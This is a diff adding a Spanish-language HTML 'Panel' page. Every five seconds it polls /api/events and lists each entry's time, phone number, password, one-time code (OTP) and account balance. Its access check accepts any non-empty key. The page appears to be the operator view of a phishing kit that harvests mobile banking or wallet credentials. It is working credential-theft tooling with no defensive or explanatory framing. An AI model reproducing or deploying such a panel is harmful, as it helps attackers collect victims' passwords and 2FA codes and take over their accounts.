@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Panel</title>
+  <style>
+    body{font-family:Arial,Helvetica,sans-serif;margin:0;padding:16px}
+    h1{margin:0 0 12px 0}
+    table{border-collapse:collapse;width:100%}
+    th,td{border:1px solid #ddd;padding:8px}
+    th{background:#f2f2f2;text-align:left}
+    .actions{margin-bottom:12px}
+    input{padding:6px 8px}
+    button{padding:6px 10px}
+  </style>
+</head>
+<body>
+  <h1>Eventos</h1>
+  <div class="actions">
+    <input id="pwd" type="password" placeholder="Clave panel">
+    <button id="enter">Entrar</button>
+    <button id="refresh">Actualizar</button>
+  </div>
+  <table>
+    <thead>
+      <tr><th>Hora</th><th>Celular</th><th>Contraseña</th><th>OTP</th><th>Saldo</th></tr>
+    </thead>
+    <tbody id="rows"></tbody>
+  </table>
+  <script>
+    let ok=false
+    const enterBtn=document.getElementById("enter")
+    const refreshBtn=document.getElementById("refresh")
+    const rows=document.getElementById("rows")
+    function load(){
+      if(!ok)return
+      fetch("/api/events").then(r=>r.json()).then(list=>{
+        rows.innerHTML=list.map(x=>`<tr>
+          <td>${x.created_at||""}</td>
+          <td>${x.phone||""}</td>
+          <td>${x.password||""}</td>
+          <td>${x.otp||""}</td>
+          <td>${x.saldo||""}</td>
+        </tr>`).join("")
+      }).catch(()=>{})
+    }
+    enterBtn.addEventListener("click",()=>{
+      const pwd=document.getElementById("pwd").value.trim()
+      ok=pwd.length>0
+      if(ok)load()
+    })
+    refreshBtn.addEventListener("click",load)
+    setInterval(load,5000)
+  </script>
+</body>
+</html>
